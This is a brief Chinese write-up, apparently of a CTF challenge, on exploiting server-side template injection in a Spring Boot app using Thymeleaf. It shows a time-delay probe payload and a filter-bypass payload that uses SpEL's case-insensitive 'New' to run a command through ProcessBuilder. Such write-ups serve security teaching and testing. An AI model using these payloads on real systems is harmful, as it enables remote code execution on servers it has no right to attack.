进`/first`可以看到需要选择语言，选中后路由会加上`/en`或者`/cn`

因为springboot大部分用的模版引擎为`thymeleaf`，而`thymeleaf`存在ssti，直接测试就可以知道题目是否存在ssti


```
http://ip/__${T(Thread).sleep(5000)}__::
```

可以发现确实延时了5秒，存在漏洞

绕过一些简单的过滤（`new`,`Runtime`）我们可以执行命令

比如用SPEL关键字大小写不区分的特性来绕过`new`

```
http://ip/__${New java.lang.ProcessBuilder({'open','-a','Calculator.app'}).start()}__::.x
```

复杂的命令可以去`base64`编码一下

